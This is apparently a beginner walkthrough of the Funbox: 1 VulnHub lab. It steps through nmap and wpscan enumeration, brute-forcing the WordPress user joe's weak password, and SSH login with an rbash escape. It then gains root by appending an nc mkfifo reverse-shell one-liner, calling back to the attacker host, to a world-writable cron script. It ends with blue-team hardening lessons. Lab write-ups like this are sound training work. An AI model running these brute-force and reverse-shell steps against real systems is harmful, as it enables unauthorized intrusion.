# Funbox: 1 — VulnHub Walkthrough (Beginner Friendly)

> **Authorized lab use only.** Run this machine inside an isolated virtual network
> (VirtualBox/VMware *host-only* adaptor). Never attack systems you do not own or
> have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: 1 |
| **Difficulty** | Easy |
| **Author** | 0815R2d2 |
| **Released** | 20 Jul 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/funbox-1,518/> |
| **Download** | <https://download.vulnhub.com/funbox/FunBox.ova> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) on VirtualBox, host-only network |
| **Target OS** | Linux |

---

## 0. What you will learn

Funbox: 1 is an easy, realistic "boot2root". The author's blurb: *"a real life
scenario, but easy going… enumerate and understand the scenario to get the
root-flag in round about 20 minutes."* It teaches the WordPress attack chain end
to end, plus a very common real-world cron privilege escalation.

- Discovering a host and enumerating an Ubuntu web server.
- Handling a **virtual-host redirect** by editing `/etc/hosts`.
- Enumerating **WordPress** with `wpscan`: finding users, then brute-forcing a
  weak password.
- Getting a foothold over **SSH** (and escaping a restricted shell if you meet one).
- Abusing a **world-writable script that root runs from cron** to become `root`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Import the `.ova`, boot it, and keep Kali
on the same host-only network.

> **Note:** the WordPress theme-editor route to a shell requires a WordPress
> **admin** account; on the standard build the user we recover (`joe`) is a normal
> subscriber, so the intended foothold is **SSH**. Where a build lets you also
> recover the `admin` password, the theme-editor reverse shell is a valid
> alternative — treat that as a bonus path.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:ab:cd:ef       PCS Systemtechnik GmbH
192.168.56.101  08:00:27:11:22:33       PCS Systemtechnik GmbH
```

```bash
# Alternative host discovery
sudo netdiscover -r 192.168.56.0/24
```

![arp scan showing the target host](images/01-recon.png)

**Target IP:** `192.168.56.101`

---

## 2. Enumeration — open ports and services

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress
|_http-title: Funbox
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** three services = three attack surfaces. SSH is the likely
> landing spot once we have credentials, and the WordPress site on port 80 is where
> we will hunt for those credentials first.

### 2.1 Handle the virtual-host redirect

Browse to `http://192.168.56.101/`. The site **redirects** to
`http://funbox.fritz.box/`, a hostname our Kali box does not know.

```text
Error: Server not found — funbox.fritz.box
```

> **Why it happens:** the WordPress install is configured with a `Site URL` of
> `funbox.fritz.box`. Apache sends a redirect there; our DNS can't resolve it. We
> fix it by adding a hosts entry so the name points at the target.

```bash
# Append the mapping to your hosts file (needs sudo)
echo "192.168.56.101 funbox.fritz.box" | sudo tee -a /etc/hosts

# Sanity check
ping -c1 funbox.fritz.box
```

```text
PING funbox.fritz.box (192.168.56.101) 56(84) bytes of data.
64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.4 ms
```

Now `http://funbox.fritz.box/` loads a WordPress blog.

### 2.2 Check robots.txt — and note the dead end

```bash
curl http://funbox.fritz.box/robots.txt
```

```text
User-agent: *
Disallow: /secret/
```

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://funbox.fritz.box/secret/
```

```text
403
```

> **Why it's a dead end:** `/secret/` is a deliberate rabbit hole on this box.
> Learning to *time-box and move on* from a decoy is part of the exercise. We come
> back to the CMS itself.

### 2.3 Enumerate WordPress users with wpscan

```bash
wpscan --url http://funbox.fritz.box/ --enumerate u
```

```text
[+] Enumerating Users (via Passive and Aggressive Methods)
[i] User(s) Identified:
[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
[+] joe
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

> **Why it works:** WordPress leaks which users exist through author archives and
> login error messages. Knowing the usernames is half of a password attack.

![nmap and wpscan output](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Brute-force a weak WordPress password

```bash
wpscan --url http://funbox.fritz.box/ \
  --usernames joe \
  --passwords /usr/share/wordlists/rockyou.txt
```

```text
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - joe / 12345
[+] Valid Combinations Found:
 | Username: joe, Password: 12345
```

> **Why it works:** `joe` chose a password that is the 3rd entry in `rockyou.txt`.
> No rate-limiting or lockout is in place, so the attack completes in seconds. This
> is the single most common real-world breach pattern: **weak, guessable
> passwords**.

> **Harden note:** `wpscan` wording varies by version (`Xmlrpc`/`wp-login`); the
> finding — `joe : 12345` — is the same.

### 3.2 Log in over SSH

```bash
ssh joe@192.168.56.101
# password: 12345
```

```text
joe@funbox:~$ id
uid=1000(joe) gid=1000(joe) groups=1000(joe)
joe@funbox:~$ whoami
joe
```

> **Why it works:** the same weak password unlocks the system's SSH service. Broken
> password hygiene is a cross-protocol problem — one guessable credential opened
> both the CMS and the OS account.

**If you land in a restricted shell (`rbash`).** Some builds give `joe` a restricted
shell, where commands like `cd` or paths are blocked. Escape it by asking SSH to
run a fresh, unrestricted shell:

```bash
ssh joe@192.168.56.101 -t "bash --noprofile"
```

```text
joe@funbox:~$ echo $SHELL
/bin/bash
```

> **Why it works:** `bash --noprofile` starts a shell that skips the startup files
> which imposed the restriction, giving you a normal interactive shell.

**Alternate foothold (some builds):** if `joe`'s FTP account can write into the
WordPress web root, you can upload a PHP reverse shell instead and trigger it over
HTTP. Not required here — it is a bonus path when present.

![The reverse shell / SSH foothold](images/04-foothold.png)
![Shell as joe](images/05-shell.png)

> **Flags:** if this build ships `user.txt`, it is normally in `/home/<user>/`.
> The main objective is `root`.

---

## 4. Privilege escalation — becoming root

Start with the standard sweep as `joe`:

```bash
id; whoami
sudo -l                                    # can joe run anything as root?
find / -perm -4000 -type f 2>/dev/null     # SUID binaries
find / -writable -type f 2>/dev/null       # files joe is allowed to modify
cat /etc/crontab; ls -la /etc/cron*        # system cron jobs
crontab -l                                 # joe's own cron jobs
```

```text
joe@funbox:~$ find / -writable -type f 2>/dev/null
/var/www/html/... (wp files)
/home/funny/.backup.sh        <-- world-writable (note the 'w' for others)
joe@funbox:~$ ls -la /home/funny/
-rwxrwxrwx  1 funny funny  ...  .backup.sh
```

> **Why it matters:** `/home/funny/.backup.sh` is **world-writable** — literally any
> user on the box (including us) can edit it. If *root* ever executes that script,
> our edit runs **as root**. The question now is: does root run it?

Confirm that root is executing it. The most reliable way is `pspy`, which watches
processes without needing root:

```bash
# Serve pspy64 from Kali, then on the target:
#   python3 -m http.server 8000   (on Kali, in the dir with pspy64)
wget http://192.168.56.10:8000/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
/tmp/pspy64
```

```text
... CMD: UID=0    PID=...    | /bin/sh /home/funny/.backup.sh
... CMD: UID=0    PID=...    | /bin/sh /home/funny/.backup.sh
```

> **Why it works:** seeing a process with `UID=0` (root) run `/home/funny/.backup.sh`
> on a schedule proves that a **root cron job** executes our world-writable script.
> (The interval is short — roughly every 5 minutes on this build; `pspy` shows it in
> real time. Names/locations can differ between builds, so trust what you observe.)

### 4.1 Inject a root reverse shell

```bash
# On Kali: start a listener
nc -lvnp 4444
```

```bash
# On the target: append a reverse-shell one-liner to the writable script
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 4444 >/tmp/f' >> /home/funny/.backup.sh
```

Wait for the next cron tick (≤ ~5 minutes). The listening `nc` receives a shell —
running as **root**, because root is the one who executed the script:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 43*12
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

> **Why it works:** the scheduler runs the job with the job owner's privileges
> (root). It never checks who last edited the script, so a `chmod 777` script in a
> user's home is effectively a root shell waiting to happen.

Grab the flag (if the build ships one):

```bash
cat /root/root.txt 2>/dev/null
cat /home/*/user.txt 2>/dev/null
```

![The world-writable script and root cron](images/06-privesc.png)
![Root shell](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Weak WordPress password (`joe:12345`) | WordPress users (login) | Account compromise; credential reuse exposes SSH |
| 2 | Weak OS password / credential reuse | SSH (port 22) | Foothold as `joe` on the host |
| 3 | Information disclosure (user enumeration) | WordPress author archives / login errors | Usernames handed to an attacker |
| 4 | World-writable script executed by root cron | `/home/funny/.backup.sh` | Local privilege escalation to `root` |

## 6. Defensive lessons (blue team)

- **Enforce strong passwords + lockouts.** WordPress should require strong
  passwords and rate-limit/limit failed logins (e.g. a WAF, `fail2ban`, or a
  login-lockout plugin). The same applies to SSH (`sshd` limits, key-only auth).
- **Don't reuse passwords across services.** A CMS password should never be the
  system account password. Use unique credentials or SSO.
- **Stop user enumeration.** Suppress the author-archive leak and genericise login
  error messages; disable XML-RPC if unused (`xmlrpc.php` is a favourite brute-force
  endpoint).
- **Fix file permissions and cron hygiene.** Cron scripts must be owned by root and
  **not** writable by anyone else (`chmod 755`/`700`, root-owned directory). Never
  let a root job execute a file inside a normal user's home. Audit with
  `find / -perm -o+w -type f`.
- **Harden WordPress generally:** remove unused themes/plugins, keep core patched,
  and disable the built-in theme/plugin editor (`define('DISALLOW_FILE_EDIT', true)`).
- **Detection ideas:** alert on WordPress brute-force patterns and `xmlrpc.php`
  floods; monitor SSH auth failures; watch for writes to cron-adjacent or world-
  writable files and for new outbound connections from the host; baseline the
  content of scheduled scripts and alert on change.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/funbox-1,518/>
- Download mirror: <https://download.vulnhub.com/funbox/FunBox.ova>
- Community writeups consulted:
  - [Funbox 1 — VulnHub walkthrough (Doyler.net)](https://www.doyler.net/security-not-included/funbox-1-vulnhub-walkthrough)
- Docs / tools:
  - [WPScan](https://wpscan.com/)
  - [OWASP — Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
  - [GTFOBins / rbash escape](https://gtfobins.github.io/)
  - [pspy — unprivileged process monitoring](https://github.com/DominicBreuker/pspy)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan and `wpscan` user enumeration
- [ ] `images/03-enum.png` — the virtual-host redirect fixed in `/etc/hosts`
- [ ] `images/04-foothold.png` — brute-forcing `joe` and logging in over SSH
- [ ] `images/05-shell.png` — shell as `joe`
- [ ] `images/06-privesc.png` — the world-writable `/home/funny/.backup.sh`
- [ ] `images/07-root-flag.png` — root shell from the cron job

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
